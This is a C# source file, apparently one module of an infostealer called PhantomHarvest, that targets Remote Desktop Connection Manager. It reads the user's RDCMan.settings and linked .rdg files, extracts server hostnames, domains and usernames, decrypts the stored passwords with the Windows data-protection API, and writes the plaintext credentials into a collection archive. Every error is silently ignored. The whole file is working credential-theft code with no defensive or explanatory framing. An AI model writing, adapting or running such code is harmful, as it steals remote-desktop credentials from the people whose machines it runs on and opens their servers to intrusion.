using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;
using PhantomHarvest.Helper;

namespace PhantomHarvest.Tools
{
	internal class RDCMan
	{
		public static void Collect(ArchiveManager zip)
		{
			try
			{
				string pwd = RDCMan.DecryptPwd();
				if (!string.IsNullOrEmpty(pwd))
				{
					using (MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(pwd)))
					{
						zip.AddStream(ArchiveManager.Compression.Deflate, RDCMan.ToolName + "/RDCMan.txt", ms, DateTime.Now, "");
					}
				}
			}
			catch
			{
			}
		}

		public static string DecryptPwd()
		{
			StringBuilder stringBuilder = new StringBuilder();
			List<string> list = new List<string>();
			XmlDocument xmlDocument = new XmlDocument();
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings";
			
			try 
			{
				byte[] bytes = LockedFile.ReadLockedFile(path);
				if (bytes == null) return "";
				using (MemoryStream ms = new MemoryStream(bytes))
				{
					xmlDocument.Load(ms);
				}
			}
			catch { return ""; }

			foreach (object obj in xmlDocument.SelectNodes("//FilesToOpen"))
			{
				string innerText = ((XmlNode)obj).InnerText;
				if (!list.Contains(innerText))
				{
					list.Add(innerText);
				}
			}
			foreach (string rdgpath in list)
			{
				stringBuilder.AppendLine(RDCMan.ParseRDGFile(rdgpath));
			}
			return stringBuilder.ToString();
		}

		private static string DecryptPassword(string password)
		{
			byte[] encryptedData = Convert.FromBase64String(password);
			password = Encoding.UTF8.GetString(ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser)).Replace("\0", "");
			return password;
		}

		private static string ParseRDGFile(string RDGPath)
		{
			StringBuilder stringBuilder = new StringBuilder();
			try
			{
				XmlDocument xmlDocument = new XmlDocument();
				byte[] bytes = LockedFile.ReadLockedFile(RDGPath);
				if (bytes == null) return "";
				using (MemoryStream ms = new MemoryStream(bytes))
				{
					xmlDocument.Load(ms);
				}

				foreach (object obj in xmlDocument.SelectNodes("//server"))
				{
					XmlNode xmlNode = (XmlNode)obj;
					string str = string.Empty;
					string str2 = string.Empty;
					string str3 = string.Empty;
					string text = string.Empty;
					string str4 = string.Empty;
					foreach (object obj2 in xmlNode)
					{
						foreach (object obj3 in ((XmlNode)obj2))
						{
							XmlNode xmlNode2 = (XmlNode)obj3;
							string name = xmlNode2.Name;
							if (!(name == "name"))
							{
								if (!(name == "profileName"))
								{
									if (!(name == "userName"))
									{
										if (!(name == "password"))
										{
											if (name == "domain")
											{
												str4 = xmlNode2.InnerText;
											}
										}
										else
										{
											text = xmlNode2.InnerText;
										}
									}
									else
									{
										str3 = xmlNode2.InnerText;
									}
								}
								else
								{
									str2 = xmlNode2.InnerText;
								}
							}
							else
							{
								str = xmlNode2.InnerText;
							}
						}
					}
					if (!string.IsNullOrEmpty(text))
					{
						string text2 = RDCMan.DecryptPassword(text);
						if (!string.IsNullOrEmpty(text2))
						{
							stringBuilder.AppendLine("hostname: " + str);
							stringBuilder.AppendLine("profilename: " + str2);
							stringBuilder.AppendLine("username: " + str4 + "\\" + str3);
							stringBuilder.AppendLine("decrypted: " + text2);
							stringBuilder.AppendLine();
						}
					}
				}
			}
			catch
			{
			}
			return stringBuilder.ToString();
		}

		public static string ToolName = "RDCMan";
	}
}
